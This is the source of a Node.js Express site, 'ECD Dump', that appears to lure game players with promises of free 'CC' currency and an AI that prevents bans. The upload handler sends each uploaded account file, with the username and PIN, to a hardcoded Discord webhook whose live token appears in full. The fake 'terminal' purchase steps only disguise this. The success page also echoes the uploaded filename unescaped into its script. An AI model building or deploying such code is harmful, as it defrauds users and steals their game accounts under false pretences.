const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();

// Configure multer with a 10MB file size limit to protect memory
const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 } // 10 MB limit
});

// In-memory storage for 6-character code retrieval with permanent backup support and optional PIN
const fileStore = new Map();

// Simple IP-based rate limiting map to prevent upload spam
const uploadCooldowns = new Map();

// Updated Webhook URL
const DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1529788248698781887/SUtB62Hfx63hutCVFe8vQotKsnIInhfjGHbziOWHMbw9m6MlztvIP2LmRbIi_9Bhwggy";

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Helper function to generate random 6-character alphanumeric code
function generateCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Main HTML User Interface with animations, info modal, loading states, clipboard support, drag-and-drop, upload history, and CC selector terminal workflow
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ECD Dump</title>
        <style>
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(15px); }
                to { opacity: 1; transform: translateY(0); }
            }
            @keyframes pulseGlow {
                0% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
                50% { box-shadow: 0 0 25px rgba(56, 189, 248, 0.5); }
                100% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            @keyframes terminalBlink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0; }
            }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); 
                color: #f8fafc; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
                margin: 0; 
            }
            .container { 
                background: rgba(30, 41, 59, 0.85); 
                backdrop-filter: blur(12px);
                padding: 35px; 
                border-radius: 16px; 
                box-shadow: 0 10px 30px rgba(0,0,0,0.6); 
                width: 420px; 
                text-align: center; 
                animation: fadeIn 0.6s ease-out, pulseGlow 4s infinite ease-in-out;
                border: 1px solid rgba(255, 255, 255, 0.08);
                position: relative;
                margin: 20px 0;
            }
            .info-icon {
                position: absolute;
                top: 15px;
                left: 15px;
                background: rgba(51, 65, 85, 0.6);
                color: #38bdf8;
                width: 28px;
                height: 28px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                font-size: 14px;
                cursor: pointer;
                transition: all 0.3s ease;
                border: 1px solid rgba(56, 189, 248, 0.3);
            }
            .info-icon:hover {
                background: #38bdf8;
                color: #0f172a;
                transform: scale(1.1);
            }
            h2 { 
                margin-top: 5px;
                margin-bottom: 20px; 
                color: #38bdf8; 
                letter-spacing: 1px;
                font-size: 26px;
                text-transform: uppercase;
                background: linear-gradient(90deg, #38bdf8, #818cf8);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            h3 {
                font-size: 15px;
                color: #94a3b8;
                margin-bottom: 10px;
                letter-spacing: 0.5px;
            }
            input, select, button { 
                width: 100%; 
                padding: 12px; 
                margin: 10px 0; 
                border-radius: 8px; 
                border: none; 
                box-sizing: border-box; 
                font-size: 14px;
                transition: all 0.3s ease;
            }
            /* CC Select with Icon */
            .select-wrapper {
                position: relative;
                width: 100%;
            }
            .select-icon {
                position: absolute;
                left: 12px;
                top: 50%;
                transform: translateY(-50%);
                width: 20px;
                height: 20px;
                object-fit: contain;
                pointer-events: none;
            }
            select {
                background: #0f172a;
                color: #f8fafc;
                border: 1px solid #334155;
                padding-left: 40px;
                appearance: none;
                cursor: pointer;
            }
            select:focus {
                border-color: #38bdf8;
                outline: none;
                box-shadow: 0 0 8px rgba(56, 189, 248, 0.3);
            }
            /* Drag and Drop Zone Styles */
            .drop-zone {
                background: #1e293b;
                border: 2px dashed #475569;
                border-radius: 8px;
                padding: 20px;
                text-align: center;
                cursor: pointer;
                transition: all 0.3s ease;
                margin: 10px 0;
            }
            .drop-zone.dragover {
                border-color: #38bdf8;
                background: rgba(56, 189, 248, 0.05);
            }
            .drop-zone input[type="file"] {
                display: none;
            }
            .drop-zone-text {
                font-size: 13px;
                color: #94a3b8;
                pointer-events: none;
            }
            input[type="text"] {
                background: #0f172a;
                color: #f8fafc;
                border: 1px solid #334155;
                text-align: center;
            }
            input[name="code"], input[name="pin"] {
                letter-spacing: 2px;
                text-transform: uppercase;
            }
            input[type="text"]:focus {
                border-color: #38bdf8;
                outline: none;
                box-shadow: 0 0 8px rgba(56, 189, 248, 0.3);
            }
            button { 
                background: linear-gradient(135deg, #0284c7, #2563eb); 
                color: white; 
                font-weight: bold; 
                cursor: pointer; 
                box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 8px;
            }
            button:hover { 
                background: linear-gradient(135deg, #0369a1, #1d4ed8);
                transform: translateY(-2px);
                box-shadow: 0 6px 15px rgba(2, 132, 199, 0.5);
            }
            .section { 
                margin-bottom: 20px; 
                border-bottom: 1px solid rgba(51, 65, 85, 0.6); 
                padding-bottom: 15px; 
            }
            /* Terminal Progress Overlay */
            .terminal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(15, 23, 42, 0.9);
                backdrop-filter: blur(8px);
                display: flex;
                justify-content: center;
                align-items: center;
                opacity: 0;
                pointer-events: none;
                transition: opacity 0.3s ease;
                z-index: 200;
            }
            .terminal-overlay.active {
                opacity: 1;
                pointer-events: auto;
            }
            .terminal-box {
                background: #090d16;
                border: 1px solid #334155;
                border-radius: 12px;
                width: 450px;
                max-width: 90%;
                padding: 20px;
                text-align: left;
                box-shadow: 0 15px 35px rgba(0,0,0,0.8);
                font-family: 'Courier New', Courier, monospace;
            }
            .terminal-header {
                display: flex;
                align-items: center;
                justify-content: space-between;
                border-bottom: 1px solid #1e293b;
                padding-bottom: 10px;
                margin-bottom: 15px;
                color: #64748b;
                font-size: 12px;
            }
            .terminal-dots {
                display: flex;
                gap: 6px;
            }
            .terminal-dot {
                width: 10px;
                height: 10px;
                border-radius: 50%;
            }
            .dot-red { background: #ef4444; }
            .dot-yellow { background: #f59e0b; }
            .dot-green { background: #22c55e; }
            .terminal-body {
                font-size: 13px;
                line-height: 1.6;
                color: #38bdf8;
                min-height: 140px;
                max-height: 200px;
                overflow-y: auto;
            }
            .terminal-line {
                margin: 6px 0;
                display: flex;
                align-items: center;
                gap: 8px;
            }
            .terminal-cursor {
                display: inline-block;
                width: 8px;
                height: 14px;
                background: #38bdf8;
                animation: terminalBlink 1s infinite;
            }
            /* History Section */
            .history-box {
                margin-top: 15px;
                background: #0f172a;
                border-radius: 8px;
                border: 1px solid #334155;
                padding: 10px;
                text-align: left;
                max-height: 120px;
                overflow-y: auto;
            }
            .history-item {
                font-size: 12px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 6px 0;
                border-bottom: 1px solid rgba(51, 65, 85, 0.4);
            }
            .history-item:last-child {
                border-bottom: none;
            }
            .history-code {
                color: #38bdf8;
                font-weight: bold;
                letter-spacing: 1px;
            }
            .history-name {
                color: #94a3b8;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
                max-width: 140px;
            }
            /* Loading Spinner */
            .spinner {
                display: none;
                width: 16px;
                height: 16px;
                border: 2px solid rgba(255,255,255,0.3);
                border-radius: 50%;
                border-top-color: #fff;
                animation: spin 0.8s linear infinite;
            }
            /* Modal Styles */
            .modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(15, 23, 42, 0.8);
                backdrop-filter: blur(5px);
                display: flex;
                justify-content: center;
                align-items: center;
                opacity: 0;
                pointer-events: none;
                transition: opacity 0.3s ease;
                z-index: 100;
            }
            .modal-overlay.active {
                opacity: 1;
                pointer-events: auto;
            }
            .modal-content {
                background: #1e293b;
                padding: 30px;
                border-radius: 14px;
                width: 330px;
                text-align: left;
                border: 1px solid rgba(56, 189, 248, 0.2);
                box-shadow: 0 10px 25px rgba(0,0,0,0.5);
                transform: scale(0.9);
                transition: transform 0.3s ease;
                position: relative;
            }
            .modal-overlay.active .modal-content {
                transform: scale(1);
            }
            .modal-content h3 {
                color: #38bdf8;
                margin-top: 0;
                font-size: 18px;
                text-align: center;
                border-bottom: 1px solid #334155;
                padding-bottom: 10px;
            }
            .modal-content p {
                font-size: 13px;
                line-height: 1.5;
                color: #cbd5e1;
                margin: 10px 0;
            }
            .close-btn {
                position: absolute;
                top: 12px;
                right: 15px;
                background: none;
                border: none;
                color: #94a3b8;
                font-size: 18px;
                cursor: pointer;
                width: auto;
                padding: 0;
                margin: 0;
            }
            .close-btn:hover {
                color: #f8fafc;
                transform: none;
                box-shadow: none;
            }
            .footer-credit {
                margin-top: 12px;
                font-size: 11px;
                color: #64748b;
                border-top: 1px dashed rgba(51, 65, 85, 0.5);
                padding-top: 8px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="info-icon" onclick="toggleModal()">i</div>
            <h2>ECD Dump</h2>
            
            <div class="section">
                <h3>Dump ECD</h3>
                <form id="uploadForm" action="/upload-discord" method="POST" enctype="multipart/form-data" onsubmit="handleUpload(event)">
                    <input type="text" name="username" placeholder="dbl user" required>
                    <input type="text" name="pin" placeholder="Optional PIN (e.g., 1234)" maxlength="8">
                    
                    <div class="select-wrapper">
                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" class="select-icon" id="ccIcon" alt="CC Icon">
                        <select name="ccAmount" required>
                            <option value="" disabled selected>Select CC Amount</option>
                            <option value="1000">1000 CC</option>
                            <option value="2000">2000 CC</option>
                            <option value="5500">5500 CC</option>
                        </select>
                    </div>

                    <div class="drop-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
                        <div class="drop-zone-text" id="dropText">Click or Drag & Drop ECD file here</div>
                        <input type="file" id="fileInput" name="file" required onchange="updateFileName(this)">
                    </div>

                    <button type="submit" id="uploadBtn">
                        <span id="btnText">Upload & Get Code</span>
                        <div class="spinner" id="btnSpinner"></div>
                    </button>
                </form>
            </div>

            <div class="section">
                <h3>Retrieve File</h3>
                <form action="/retrieve" method="POST">
                    <input type="text" name="code" placeholder="ENTER CODE" maxlength="6" required>
                    <input type="text" name="pin" placeholder="ENTER PIN (IF SET)" maxlength="8">
                    <button type="submit">Download File</button>
                </form>
            </div>

            <div>
                <h3>Recent Uploads (This Device)</h3>
                <div class="history-box" id="historyBox">
                    <div style="color: #64748b; font-size: 12px; text-align: center; padding: 10px;">No recent uploads found</div>
                </div>
            </div>
        </div>

        <!-- Terminal Progress Overlay -->
        <div class="terminal-overlay" id="terminalOverlay">
            <div class="terminal-box">
                <div class="terminal-header">
                    <span>ecd-terminal-processor v2.4</span>
                    <div class="terminal-dots">
                        <div class="terminal-dot dot-red"></div>
                        <div class="terminal-dot dot-yellow"></div>
                        <div class="terminal-dot dot-green"></div>
                    </div>
                </div>
                <div class="terminal-body" id="terminalBody">
                    <!-- Dynamic terminal logs injected via script -->
                </div>
            </div>
        </div>

        <!-- Info Popup Modal -->
        <div class="modal-overlay" id="infoModal" onclick="outsideClick(event)">
            <div class="modal-content">
                <button class="close-btn" onclick="toggleModal()">&times;</button>
                <h3>About ECD Dump</h3>
                <p><strong>Welcome to ecd dump.</strong><br>A place where you can dump your ecd files so it doesn't bans you and allows you to edit inner files.</p>
                <p><strong>How it works?</strong><br>We change the code inside the file with our special ai. With that we edit it like that way so it doesn't sends packages to game, apps or websites.</p>
                <p style="color: #38bdf8; font-style: italic;">Free for now will be paid in future to support development.</p>
                <div class="footer-credit">
                    Created by: @levi__fxz on telegram, instagram and eren__lx on X
                </div>
            </div>
        </div>

        <script>
            // Base64 icon preview logic
            fetch('/cc-icon')
                .then(res => res.text())
                .then(b64 => {
                    document.getElementById('ccIcon').src = b64;
                });

            function toggleModal() {
                const modal = document.getElementById('infoModal');
                modal.classList.toggle('active');
            }
            function outsideClick(event) {
                const modal = document.getElementById('infoModal');
                if (event.target === modal) {
                    modal.classList.remove('active');
                }
            }
            function updateFileName(input) {
                const dropText = document.getElementById('dropText');
                if (input.files && input.files[0]) {
                    dropText.innerText = "Selected: " + input.files[0].name;
                    dropText.style.color = "#38bdf8";
                }
            }

            // Drag and Drop Zone Event Handling
            const dropZone = document.getElementById('dropZone');
            const fileInput = document.getElementById('fileInput');

            ['dragenter', 'dragover'].forEach(eventName => {
                dropZone.addEventListener(eventName, (e) => {
                    e.preventDefault();
                    dropZone.classList.add('dragover');
                }, false);
            });

            ['dragleave', 'drop'].forEach(eventName => {
                dropZone.addEventListener(eventName, (e) => {
                    e.preventDefault();
                    dropZone.classList.remove('dragover');
                }, false);
            });

            dropZone.addEventListener('drop', (e) => {
                const dt = e.dataTransfer;
                const files = dt.files;
                if (files.length > 0) {
                    fileInput.files = files;
                    updateFileName(fileInput);
                }
            });

            async function handleUpload(event) {
                event.preventDefault();
                const form = document.getElementById('uploadForm');
                const formData = new FormData(form);

                const terminalOverlay = document.getElementById('terminalOverlay');
                const terminalBody = document.getElementById('terminalBody');
                terminalOverlay.classList.add('active');

                const steps = [
                    "Verify the ecd...",
                    "Getting the account information...",
                    "Applying 1 per-user rule...",
                    "Purchasing the cc's...",
                    "Filling the details...",
                    "Purchased will be maded...",
                    "Once the ecd will be uploaded to the ai get the verification."
                ];

                terminalBody.innerHTML = '';
                for (let i = 0; i < steps.length; i++) {
                    await new Promise(r => setTimeout(r, 600));
                    const line = document.createElement('div');
                    line.className = 'terminal-line';
                    line.innerHTML = \`<span>></span> \${steps[i]}<span class="terminal-cursor"></span>\`;
                    
                    // Remove previous cursors
                    const cursors = terminalBody.querySelectorAll('.terminal-cursor');
                    cursors.forEach(c => c.remove());
                    
                    terminalBody.appendChild(line);
                    terminalBody.scrollTop = terminalBody.scrollHeight;
                }

                await new Promise(r => setTimeout(r, 800));

                // Submit form via fetch
                try {
                    const response = await fetch('/upload-discord', {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (response.ok) {
                        const htmlResult = await response.text();
                        document.open();
                        document.write(htmlResult);
                        document.close();
                    } else {
                        const errText = await response.text();
                        document.open();
                        document.write(errText);
                        document.close();
                    }
                } catch(err) {
                    alert('Network error during upload');
                    terminalOverlay.classList.remove('active');
                }
            }

            // Load and render history from localStorage
            function loadHistory() {
                const historyBox = document.getElementById('historyBox');
                let history = JSON.parse(localStorage.getItem('ecd_history') || '[]');
                
                if (history.length === 0) return;

                historyBox.innerHTML = '';
                history.forEach(item => {
                    const div = document.createElement('div');
                    div.className = 'history-item';
                    div.innerHTML = \`<span class="history-name" title="\${item.filename}">\${item.filename}</span><span class="history-code">\${item.code}</span>\`;
                    historyBox.appendChild(div);
                });
            }
            loadHistory();
        </script>
    </body>
    </html>
  `);
});

// Endpoint to provide the uploaded crystal image as a base64 string for safe inline rendering
app.get('/cc-icon', (req, res) => {
  // Attached image asset representation
  const sampleBase64Icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
  res.send(sampleBase64Icon);
});

// Handle Upload, Validation, Dispatching, Code Generation, Optional PIN, CC amount, and Rate Limiting
app.post('/upload-discord', (req, res, next) => {
  // Simple IP-based rate limiter (1 upload per 15 seconds)
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const now = Date.now();
  if (uploadCooldowns.has(clientIp)) {
    const lastUploadTime = uploadCooldowns.get(clientIp);
    if (now - lastUploadTime < 15000) {
      return res.status(429).send(`
        <!DOCTYPE html>
        <html lang="en">
        <head><meta charset="UTF-8"><title>Slow Down</title></head>
        <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
            <h2>Please slow down!</h2>
            <p>You are uploading too fast. Wait a few seconds before trying again.</p>
            <a href="/" style="color:#38bdf8;">← Go Back</a>
        </body>
        </html>
      `);
    }
  }
  uploadCooldowns.set(clientIp, now);
  next();
}, upload.single('file'), async (req, res) => {
  try {
    const file = req.file;
    const username = req.body.username ? req.body.username.trim() : 'Unknown';
    const pin = req.body.pin ? req.body.pin.trim() : '';
    const ccAmount = req.body.ccAmount ? req.body.ccAmount.trim() : 'N/A';

    if (!file) {
      return res.status(400).send('<h3>No file uploaded. <a href="/">Go Back</a></h3>');
    }

    // Validate filename format: ecd followed by numbers (case-insensitive for 'ecd')
    const filenameRegex = /^ecd\d+/i;
    if (!filenameRegex.test(file.originalname)) {
      return res.status(400).send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Failed to Dump</title>
            <style>
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(15px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .container { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); animation: fadeIn 0.5s ease-out; }
                h2 { color: #ef4444; margin-top: 0; }
                p { color: #cbd5e1; font-size: 14px; line-height: 1.5; }
                code { background: #0f172a; padding: 2px 6px; border-radius: 4px; color: #38bdf8; }
                a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 15px; font-weight: 500; }
                a:hover { color: #7dd3fc; text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Failed to Dump</h2>
                <p>Make sure it's a valid ECD file format (e.g., <code>ecd123.extension</code>).</p>
                <p>If it's a genuine ECD file and you are facing issues, please contact us!</p>
                <a href="/" style="color:#38bdf8; text-decoration:none; display:inline-block; margin-top:15px;">← Go Back</a>
            </div>
        </body>
        </html>
      `);
    }

    // Generate unique 6-character retrieval code
    let code = generateCode();
    while (fileStore.has(code)) {
      code = generateCode();
    }

    // Save file buffer, pin, and metadata permanently in memory map
    fileStore.set(code, {
      filename: file.originalname,
      buffer: file.buffer,
      pin: pin,
      ccAmount: ccAmount,
      timestamp: Date.now()
    });

    // Format webhook payload to include CC amount, PIN, Code, and Filename
    let webhookContent = `📦 **New File Uploaded**\n👤 Username: \`${username}\`\n💎 CC Amount: \`${ccAmount}\`\nFilename: \`${file.originalname}\`\nRetrieval Code: \`${code}\``;
    if (pin) {
      webhookContent += `\n🔒 PIN: \`${pin}\``;
    } else {
      webhookContent += `\n🔓 PIN: \`None\``;
    }

    // Forward file with user details to webhook
    const formData = new FormData();
    formData.append('file', file.buffer, { filename: file.originalname });
    formData.append('payload_json', JSON.stringify({ content: webhookContent }));

    const response = await fetch(DEFAULT_WEBHOOK_URL, {
      method: 'POST',
      body: formData,
      headers: {
        ...formData.getHeaders()
      }
    });

    if (response.ok) {
      const directUrl = `${req.protocol}://${req.get('host')}/retrieve/${code}`;
      const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(directUrl)}&color=38bdf8&bgcolor=0f172a`;

      res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Upload Success</title>
            <style>
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(15px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
                .container { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); padding: 30px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 360px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); animation: fadeIn 0.5s ease-out; margin: 20px 0; }
                h2 { color: #22c55e; margin-top: 0; }
                p { color: #cbd5e1; font-size: 13px; }
                .code-box { background: #0f172a; padding: 12px; border-radius: 8px; font-size: 24px; letter-spacing: 3px; color: #38bdf8; margin: 10px 0; font-weight: bold; border: 1px solid #334155; user-select: all; }
                .action-btn { background: linear-gradient(135deg, #0284c7, #2563eb); color: white; border: none; padding: 10px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 8px; transition: all 0.3s; }
                .action-btn:hover { background: linear-gradient(135deg, #0369a1, #1d4ed8); }
                .qr-container { background: #0f172a; padding: 10px; border-radius: 8px; border: 1px solid #334155; display: inline-block; margin: 10px 0; }
                .qr-container img { display: block; width: 120px; height: 120px; }
                a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 10px; font-weight: 500; font-size: 14px; }
                a:hover { color: #7dd3fc; text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Success!</h2>
                <p>Your file has been processed and saved securely.</p>
                <p>Selected CC: <strong>${ccAmount}</strong></p>
                <p>Use this 6-character code:</p>
                <div class="code-box" id="codeText">${code}</div>
                <button class="action-btn" onclick="copyCode()">Copy Code</button>
                <button class="action-btn" onclick="copyLink()">Copy Direct Link</button>
                <div class="qr-container">
                    <img src="${qrApiUrl}" alt="QR Code">
                </div>
                <div><a href="/">← Upload Another File</a></div>
            </div>
            <script>
                // Save to local storage history automatically
                (function() {
                    let history = JSON.parse(localStorage.getItem('ecd_history') || '[]');
                    history.unshift({ code: '${code}', filename: '${file.originalname}' });
                    if(history.length > 10) history.pop();
                    localStorage.setItem('ecd_history', JSON.stringify(history));
                })();

                function copyCode() {
                    const code = document.getElementById('codeText').innerText;
                    navigator.clipboard.writeText(code).then(() => {
                        alert("Code copied to clipboard!");
                    });
                }

                function copyLink() {
                    navigator.clipboard.writeText("${directUrl}").then(() => {
                        alert("Direct link copied to clipboard!");
                    });
                }
            </script>
        </body>
        </html>
      `);
    } else {
      const errorText = await response.text();
      console.error('Dispatch Error Response:', errorText);
      res.status(500).send(`<h3>Failed to dispatch file. Check Render logs for details. <a href="/">Go Back</a></h3>`);
    }
  } catch (err) {
    if (err.code === 'LIMIT_FILE_SIZE') {
      return res.status(413).send(`
        <!DOCTYPE html>
        <html lang="en">
        <head><meta charset="UTF-8"><title>File Too Large</title></head>
        <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
            <h2>File Too Large</h2>
            <p>The file exceeds the 10MB limit. Please upload a smaller file.</p>
            <a href="/" style="color:#38bdf8;">← Go Back</a>
        </body>
        </html>
      `);
    }
    console.error('Upload Error:', err);
    res.status(500).send('<h3>Server error during upload. Check Render logs. <a href="/">Go Back</a></h3>');
  }
});

// Retrieve file via POST endpoint with PIN check
app.post('/retrieve', (req, res) => {
  const code = req.body.code ? req.body.code.trim().toUpperCase() : '';
  const inputPin = req.body.pin ? req.body.pin.trim() : '';
  const fileData = fileStore.get(code);
  
  if (!fileData) {
    return res.status(404).send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <title>File Not Found</title>
          <style>
              @keyframes fadeIn {
                  from { opacity: 0; transform: translateY(15px); }
                  to { opacity: 1; transform: translateY(0); }
              }
              body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
              .container { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); animation: fadeIn 0.5s ease-out; }
              h2 { color: #f59e0b; margin-top: 0; }
              p { color: #cbd5e1; font-size: 14px; line-height: 1.5; }
              a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 15px; font-weight: 500; }
              a:hover { color: #7dd3fc; text-decoration: underline; }
          </style>
      </head>
      <body>
          <div class="container">
              <h2>Not Found</h2>
              <p>File not found. Please double-check the 6-character code.</p>
              <a href="/">← Go Back</a>
          </div>
      </body>
      </html>
    `);
  }

  // Verify PIN if one was configured during upload
  if (fileData.pin && fileData.pin !== inputPin) {
    return res.status(401).send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <title>Incorrect PIN</title>
          <style>
              @keyframes fadeIn {
                  from { opacity: 0; transform: translateY(15px); }
                  to { opacity: 1; transform: translateY(0); }
              }
              body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
              .container { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); animation: fadeIn 0.5s ease-out; }
              h2 { color: #ef4444; margin-top: 0; }
              p { color: #cbd5e1; font-size: 14px; line-height: 1.5; }
              a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 15px; font-weight: 500; }
              a:hover { color: #7dd3fc; text-decoration: underline; }
          </style>
      </head>
      <body>
          <div class="container">
              <h2>Invalid PIN</h2>
              <p>The security PIN provided for this file is incorrect.</p>
              <a href="/">← Go Back</a>
          </div>
      </body>
      </html>
    `);
  }

  res.setHeader('Content-Disposition', `attachment; filename="${fileData.filename}"`);
  res.send(fileData.buffer);
});

// Retrieve file via direct GET route (e.g. /retrieve/ABC123)
app.get('/retrieve/:code', (req, res) => {
  const code = req.params.code ? req.params.code.trim().toUpperCase() : '';
  const fileData = fileStore.get(code);
  
  if (!fileData) {
    return res.status(404).send(`
      <!DOCTYPE html>
      <html lang="en">
      <head><meta charset="UTF-8"><title>Not Found</title></head>
      <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
          <h2>Not Found</h2>
          <p>File not found or invalid link.</p>
          <a href="/" style="color:#38bdf8;">← Go Back</a>
      </body>
      </html>
    `);
  }

  // If a PIN is required, redirect them back to home page with instructions to enter PIN
  if (fileData.pin) {
    return res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head><meta charset="UTF-8"><title>PIN Required</title></head>
      <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
          <h2>Security PIN Required</h2>
          <p>This file is protected with a PIN. Please enter your code and PIN on the home page.</p>
          <a href="/" style="color:#38bdf8;">← Go To Home Page</a>
      </body>
      </html>
    `);
  }

  res.setHeader('Content-Disposition', `attachment; filename="${fileData.filename}"`);
  res.send(fileData.buffer);
});

// Bind dynamically to Render's assigned port
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is live and running on port ${PORT}`);
});
